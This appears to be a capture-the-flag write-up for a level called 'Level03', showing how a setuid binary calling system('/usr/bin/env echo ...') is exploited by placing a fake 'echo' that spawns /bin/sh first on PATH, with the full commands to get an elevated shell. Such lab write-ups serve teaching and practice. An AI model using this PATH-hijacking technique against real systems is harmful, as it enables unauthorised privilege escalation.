# Level03

Copy the binary, which is an ELF file:

```
scp -P 4242 level03@192.168.122.228:/home/user/level03/level03 .
```

Use a disassembler like Binary Ninja to inspect it. You'll notice a privilege escalation via `setresgid`/`setresuid` followed by a vulnerable `system()` call:

```
080484a4        int32_t eax = getegid();
080484b6        int32_t eax_1 = geteuid();
080484d6        setresgid(eax, eax, eax);
080484f2        setresuid(eax_1, eax_1, eax_1);
08048504        return system("/usr/bin/env echo Exploit me");
```

The vulnerability is that `env` resolves `echo` using `$PATH`, so we can hijack it by injecting a fake `echo` binary earlier in the path.

Create a fake `echo` that spawns a shell:

```bash
mkdir /tmp/fake
echo '/bin/sh' > /tmp/fake/echo
chmod +x /tmp/fake/echo
PATH=/tmp/fake:$PATH ./level03
```

This executes our fake `echo` as `flag03`, dropping us into a shell with elevated privileges.
